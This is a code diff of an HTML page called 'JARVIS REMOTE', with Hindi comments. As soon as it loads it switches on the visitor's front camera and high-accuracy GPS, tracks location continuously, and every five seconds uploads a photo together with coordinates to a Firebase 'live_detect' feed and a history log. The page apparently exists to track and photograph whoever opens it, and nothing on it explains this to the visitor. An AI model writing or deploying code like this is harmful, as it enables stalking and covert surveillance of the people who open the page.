@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>JARVIS REMOTE - INSTANT SYNC</title>
+    <title>JARVIS REMOTE - PERFECT GPS</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
@@ -18,11 +18,11 @@
 </head>
 <body>
     <div class="control-box">
-        <h2>JARVIS INSTANT v10 <span class="live-dot"></span></h2>
-        <p style="color: #888; font-size: 13px;">इंस्टेंट सिंक मोड एक्टिवेटेड</p>
+        <h2>JARVIS ACCURATE v11 <span class="live-dot"></span></h2>
+        <p style="color: #888; font-size: 13px;">हाई-एक्यूरेसी जीपीएस ट्रैकिंग सक्रिय है</p>
         <video id="v" autoplay playsinline muted></video>
         <canvas id="c"></canvas>
-        <div class="status-text" id="log-status">सिस्टम तुरंत कनेक्ट हो रहा है...</div>
+        <div class="status-text" id="log-status">सटीक जीपीएस लॉक किया जा रहा है...</div>
     </div>
 
     <script>
@@ -39,23 +39,34 @@
         let currentLat = 0;
         let currentLon = 0;
 
-        // 🚀 DOM लोड होते ही बिना इंतज़ार किए तुरंत ट्रैकिंग शुरू
         document.addEventListener("DOMContentLoaded", () => {
-            initInstantCapture();
+            initPerfectTracker();
         });
 
-        async function initInstantCapture() {
+        async function initPerfectTracker() {
             const statusDiv = document.getElementById('log-status');
             
-            // जीपीएस ट्रैकिंग तुरंत चालू करें
-            navigator.geolocation.getCurrentPosition((pos) => {
+            // 🎯 परफेक्ट हाई-एक्यूरेसी जीपीएस कॉन्फ़िगरेशन
+            const gpsOptions = {
+                enableHighAccuracy: true, // मोबाइल के असली हार्डवेयर GPS को एक्टिवेट करेगा
+                timeout: 10000,           // 10 सेकंड के अंदर सटीक लोकेशन ढूंढना अनिवार्य है
+                maximumAge: 0             // कोई भी पुराना कैश्ड डेटा इस्तेमाल नहीं होगा, एकदम फ्रेश लाइव डेटा
+            };
+
+            // लगातार लाइव और सटीक लोकेशन ट्रैक करने के लिए watchPosition
+            navigator.geolocation.watchPosition((pos) => {
                 currentLat = pos.coords.latitude;
                 currentLon = pos.coords.longitude;
+                
+                // मेन लाइव नोड पर तुरंत अपडेट भेजें
                 database.ref('live_detect/location').set({ lat: currentLat, lon: currentLon });
-            }, err => console.log("GPS Waiting..."), { enableHighAccuracy: true });
+                statusDiv.innerHTML = `🎯 GPS लॉक (सटीक): ${currentLat.toFixed(6)}, ${currentLon.toFixed(6)}`;
+            }, (err) => {
+                console.log("GPS त्रुटि, पुनः प्रयास जारी...", err);
+                statusDiv.innerHTML = "⚠️ सटीक GPS सिग्नल का इंतज़ार है...";
+            }, gpsOptions);
 
             try {
-                // कैमरे को तुरंत कमांड भेजें
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: "user" }, 
                     audio: false 
@@ -64,10 +75,9 @@
                 const video = document.getElementById('v');
                 video.srcObject = stream;
                 
-                // जैसे ही कैमरे का डेटा प्ले होने के लिए तैयार हो, तुरंत पहली फोटो खींचे
                 video.addEventListener('loadeddata', () => {
-                    captureNow(); // ⚡ तुरंत पहली फोटो बिना किसी डिले के
-                    setInterval(captureNow, 5000); // उसके बाद हर 5 सेकंड में नया रिकॉर्ड
+                    captureInstantData(); // तुरंत पहली फोटो
+                    setInterval(captureInstantData, 5000); // हर 5 सेकंड में कंबाइंड पैकेट
                 });
 
             } catch(e) {
@@ -75,11 +85,10 @@
             }
         }
 
-        function captureNow() {
+        function captureInstantData() {
             const v = document.getElementById('v');
             const c = document.getElementById('c');
-            const statusDiv = document.getElementById('log-status');
-
+            
             c.width = 320; 
             c.height = 240;
             const ctx = c.getContext('2d');
@@ -89,13 +98,13 @@
             const timestamp = Date.now();
             const currentTimeString = new Date().toLocaleTimeString();
 
-            // लाइव डैशबोर्ड पर तुरंत भेजें
+            // लाइव डैशबोर्ड पर तुरंत इमेज भेजें
             database.ref('live_detect').update({
                 photo: compressedPhoto,
                 last_updated: timestamp
             });
 
-            // जार्विस हिस्ट्री में लोकेशन के साथ तुरंत सेव करें
+            // जार्विस हिस्ट्री में अब जाएगी बिल्कुल सटीक जीपीएस लोकेशन और फोटो एक साथ
             database.ref('jarvis_history/' + timestamp).set({
                 time: currentTimeString,
                 photo: compressedPhoto,
@@ -103,8 +112,6 @@
                     lat: currentLat,
                     lon: currentLon
                 }
-            }).then(() => {
-                statusDiv.innerHTML = `⚡ तुरंत सिंक हुआ: ${currentTimeString}`;
             });
         }
     </script>
